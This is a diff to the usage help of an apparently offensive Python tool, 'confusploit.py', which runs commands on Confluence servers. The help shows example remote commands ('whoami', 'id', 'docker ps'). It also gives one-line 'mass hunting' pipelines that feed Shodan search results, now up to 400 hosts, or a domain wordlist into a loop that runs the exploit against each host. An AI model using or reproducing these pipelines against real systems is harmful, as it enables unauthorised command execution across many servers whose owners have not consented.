@@ -55,7 +55,7 @@ def main():
     print(f"{Fore.CYAN}EXAMPLE: python3 confusploit.py https://example.com <command>{Style.BRIGHT}")
     print(f"{Fore.CYAN}EXAMPLE: python3 confusploit.py https://example.com whoami{Style.BRIGHT}")
     print(f"{Fore.CYAN}EXAMPLE: python3 confusploit.py https://example.com 'docker ps'{Style.BRIGHT}\n")
-    print(f"{Fore.YELLOW}MASS HUNTING WITH SHODAN:\nshodan search Confluence --fields hostnames --limit 100 | awk '{{print $1}}' | grep confluence | while read host do ; do python3 confusploit.py $host id; done{Style.RESET_ALL}\n")
+    print(f"{Fore.YELLOW}MASS HUNTING WITH SHODAN:\nshodan search Confluence --fields ip_str,port,hostnames --limit 400 | grep confluence | awk '{{print $1}}' | while read host do ; do python3 confusploit.py $host id; done{Style.RESET_ALL}\n")
     print(f"{Fore.LIGHTYELLOW_EX}MASS HUNTING WITH A WORDLIST:\ncat confluence_domains.txt | awk '{{print $1}}' | grep confluence | while read host do ; do python3 confusploit.py $host id; done{Style.RESET_ALL}\n")
     return
   
